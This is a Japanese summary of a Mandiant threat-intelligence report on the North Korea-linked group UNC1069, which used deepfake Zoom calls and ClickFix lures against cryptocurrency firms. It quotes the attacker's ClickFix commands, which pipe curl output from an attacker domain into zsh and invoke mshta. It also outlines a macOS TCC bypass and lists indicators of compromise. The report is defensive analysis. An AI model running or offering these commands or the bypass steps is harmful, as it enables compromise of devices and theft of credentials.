---
title: "UNC1069 Targets Cryptocurrency Sector with New Tooling and AI-Enabled Social Engineering"
source: "https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering?hl=en"
author:
  - "[[Ross Inman]]"
  - "[[Adrian Hernandez]]"
published: 2026-02-09
created: 2026-04-04
description: "Mandiantが調査した北朝鮮関連脅威アクターUNC1069による暗号通貨セクターへの標的型攻撃の詳細分析。ディープフェイク動画やClickFix手法を用いたソーシャルエンジニアリング、7つのマルウェアファミリー（SILENCELIFT、DEEPBREATH、CHROMEPUSHなど）の展開、macOSのTCCバイパスなどの高度な技術を解説。"
tags:
  - "clippings"
  - "Threat Intelligence"
  - "North Korea"
  - "DPRK"
  - "Cryptocurrency"
  - "Social Engineering"
  - "Deepfake"
  - "macOS"
  - "Malware"
  - "ClickFix"
---

## 概要

Mandiantは、2018年から活動する北朝鮮系の金銭目的の脅威アクター **UNC1069** が暗号通貨・DeFiセクターのFinTech企業を標的にした侵害を調査した。この攻撃では、侵害されたTelegramアカウント、偽のZoomミーティング、ClickFix感染ベクター、AIディープフェイク動画を組み合わせた高度なソーシャルエンジニアリングが使用された。調査の結果、**7つの異なるマルウェアファミリー**が単一ホスト上に展開されたことが判明し、そのうち3つ（SILENCELIFT、DEEPBREATH、CHROMEPUSH）は新たに発見されたものである。この攻撃は暗号通貨の窃取と、被害者のデータを活用した将来のソーシャルエンジニアリングキャンペーンの両方を目的としていた。

## 主要なトピック

### 初期ベクターとソーシャルエンジニアリング

- 被害者は、UNC1069によって**侵害された暗号通貨企業幹部のTelegramアカウント**を通じて接触された
- アカウントの本来の所有者は別のSNSで乗っ取りの警告を投稿していた
- 攻撃者は信頼関係を構築した後、**Calendlyリンク**を送信して30分のミーティングを設定
- ミーティングリンクは攻撃者のインフラ上にホストされた偽のZoomミーティング（`zoom[.]uswe05[.]us`）に誘導
- ミーティング中、別の暗号通貨企業CEOの**ディープフェイク動画**が表示されたと被害者が報告
- 音声トラブルを装った「トラブルシューティング」として**ClickFix攻撃**を実行 — ユーザーに悪意あるコマンドの実行を誘導
- UNC1069は**Gemini**やGPT-4oモデルなどのAIツールを、ツール開発・偵察・画像/動画編集に活用

### 感染チェーン

macOS向けの「トラブルシューティング」コマンド:

```
system_profiler SPAudioData
softwareupdate --evaluate-products --products audio --agree-to-license
curl -A audio -s hxxp://mylingocoin[.]com/audio/fix/6454694440 | zsh
system_profiler SPSoundCardData
softwareupdate --evaluate-products --products soundcard
system_profiler SPSpeechData
softwareupdate --evaluate-products --products speech --agree-to-license
```

Windows向けコマンド:

```
setx audio_volume 100
pnputil /enum-devices /connected /class "Audio"
mshta hxxp://mylingocoin[.]com/audio/fix/6454694440
wmic sounddev get Caption, ProductName, DeviceID, Status
msdt -id AudioPlaybackDiagnostic
exit
```

感染フロー:
1. **WAVESHAPER**（C++バックドア）が最初に展開 — ペイロードのダウンロード・実行を担当
2. **HYPERCALL**（Goベースダウンローダー）がWAVESHAPERを介して展開
3. HYPERCALLは以下を展開:
   - **HIDDENCALL** — ハンズオンキーボードアクセスを提供するバックドア
   - **SUGARLOADER** — 既知のダウンローダー
   - **SILENCELIFT** — システム情報をC2にビーコンするバックドア

### XProtectによる検出

- macOS内蔵のアンチウイルス技術 **XProtect** の動作ベース検出サービス（XBS）が活用された
- XPdb（SQLite 3データベース、`/var/protected/xprotect/XPdb`）から、削除済みの悪意あるプログラムのファイルパスとSHA256ハッシュが復元された
- **EDR製品が存在しない環境でも**、XPdbのタイムスタンプにより感染の時系列を再構築できた

### データ収集と永続化

#### DEEPBREATH（Swiftベースのデータマイナー）

- macOSのプライバシー機能 **TCC（Transparency, Consent, and Control）データベースをバイパス**
- バイパス手順:
  1. Finderアプリのフルディスクアクセス権限を悪用してTCCフォルダをリネーム
  2. `TCC.db`を一時フォルダにコピーして権限を注入
  3. 変更済みデータベースを元の場所に復元
- 窃取対象:
  - ユーザーKeychain（ログイン資格情報）
  - Chrome、Brave、Edgeのブラウザデータ（Cookie、ログインデータ、拡張機能設定）
  - 2バージョンのTelegramユーザーデータ
  - Apple Notesデータ
- ZIPアーカイブに圧縮し、curlで外部サーバーにエクスフィルトレーション

#### CHROMEPUSH（C++ベースのデータマイナー）

- **Chromiumベースブラウザの拡張機能**として偽装（Google Docs Offlineを装う）
- ネイティブメッセージングホストとして永続化 — ブラウザ起動時に自動実行
- 対応ブラウザ: Chrome、Brave、Arc、Microsoft Edge
- 機能:
  - キーストロークの記録
  - ユーザー名/パスワード入力の監視
  - ブラウザCookieの抽出
  - スクリーンキャプチャ（設定ファイルで制御）
- 収集データはHTTP POSTで`cmailer[.]pro:80/upload`に送信

#### SUGARLOADER（永続化メカニズム）

- Launch Daemon（`/Library/LaunchDaemons/com.apple.system.updater.plist`）を使用して永続化
- macOS起動時にSUGARLOADERを自動実行
- SUGARLOADERはCHROMEPUSHの展開専用に使用

### UNC1069の概要

- **2018年以降**Mandiantが追跡する金銭目的の脅威アクター
- **北朝鮮との関連**が高い信頼度で疑われている
- **2023年以降**、スピアフィッシングと伝統的金融（TradFi）から**Web3業界**へターゲットを移行
- 攻撃対象: 中央集権型取引所（CEX）、金融機関のソフトウェア開発者、ハイテク企業、ベンチャーキャピタルファンド
- Kaspersky報告: UNC1069と重複する **Bluenoroff** もGPT-4oモデルで画像編集するなどGenAIツールを採用

## 重要な事実・データ

- **7つのマルウェアファミリー**が単一ホストに展開（WAVESHAPER、HYPERCALL、HIDDENCALL、DEEPBREATH、SUGARLOADER、CHROMEPUSH、SILENCELIFT）
- **6つが新規発見** — SUGARLOADERのみが既知のマルウェア
- HYPERCALLとHIDDENCALLは同一の`t_`命名規則を使用 — 統一された開発環境を示唆
- 開発パス: `/Users/mac/Documents/go_t/`（AOTファイルから復元）
- HYPERCALLのC2はWebSocket（`wss://`）で通信
- DEEPBREATHはFinderのフルディスクアクセス権限を悪用してTCCバイパスを実現
- Rosettaキャッシュ分析により、リフレクティブロードされたHIDDENCALLの機能解析が可能に

## ネットワークIOC

| インジケーター | 説明 |
|---|---|
| `mylingocoin.com` | 初期感染ペイロードホスト |
| `zoom.uswe05.us` | 偽Zoomミーティングホスト |
| `breakdream.com` | SUGARLOADER C2 |
| `dreamdie.com` | SUGARLOADER C2 |
| `support-zoom.us` | SILENCELIFT C2 |
| `supportzm.com` | HYPERCALL C2 |
| `zmsupport.com` | HYPERCALL C2 |
| `cmailer.pro` | CHROMEPUSH アップロードサーバー |

## 結論・示唆

### 著者の結論

- UNC1069は**AIを単純な生産性向上から積極的な攻撃運用へと活用を進化**させている
- 単一ホストへの大量のツール展開は、**暗号通貨窃取と将来のソーシャルエンジニアリングの二重目的**を持つ高度に決意ある攻撃であることを示す
- SUGARLOADERに加えて複数の新規マルウェアファミリーの展開は、UNC1069の**能力の大幅な拡大**を示す

### 実践的な示唆

- 暗号通貨関連企業は、Telegram経由の不審な連絡やZoomミーティングへの招待に警戒すべき
- macOS環境でも**EDRの導入**が必要 — 本事例ではEDR不在によりXProtectのみで調査を実施
- **TCC保護の限界**を認識し、追加のセキュリティレイヤーを検討すべき
- ブラウザ拡張機能の監視とネイティブメッセージングホストの異常検知を強化すべき
- Google SecOpsの検出ルール（Mandiant Intel Emerging Threats、Mandiant Hunting Rules）を活用して監視強化を推奨

## 制限事項・注意点

- ディープフェイク使用についてはフォレンジック証拠による独立した検証ができず、被害者の報告に基づく
- AppleScriptペイロードの内容はシステム上のフォレンジックアーティファクトから復元できなかった
- HYPERCALLの一部の設定パラメータは未使用であり、UNC1069の一部のマルウェア開発者の技術的成熟度の限界を示唆
- IOCの完全なリストはGTIコレクション（VirusTotal登録ユーザー向け）で提供

---

*Source: [UNC1069 Targets Cryptocurrency Sector with New Tooling and AI-Enabled Social Engineering](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering?hl=en)*